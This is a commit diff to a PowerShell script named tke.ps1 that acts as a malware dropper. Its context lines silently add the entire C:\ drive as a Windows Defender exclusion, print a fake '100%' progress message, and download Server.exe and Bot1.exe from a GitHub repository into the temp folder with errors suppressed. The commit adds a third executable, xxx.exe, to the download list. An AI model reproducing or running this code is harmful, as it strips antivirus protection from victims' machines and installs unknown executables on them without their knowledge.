1ef75d871bc6e1178141b2c2131b72cd92b2bb95
sys1e <siscord30@gmail.com>
2026-04-17 19:52:06 +0300

    tke.ps1

--- tke.ps1
+++ tke.ps1
@@ -20,8 +20,10 @@ Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "100%"
 $url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
 $url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot1.exe"
+$url3 = "https://github.com/sys1e/cmd/raw/refs/heads/main/xxx.exe"
 $path1 = "$env:TEMP\Server.exe"
 $path2 = "$env:TEMP\Bot1.exe"
+$path3 = "$env:TEMP\xxx.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
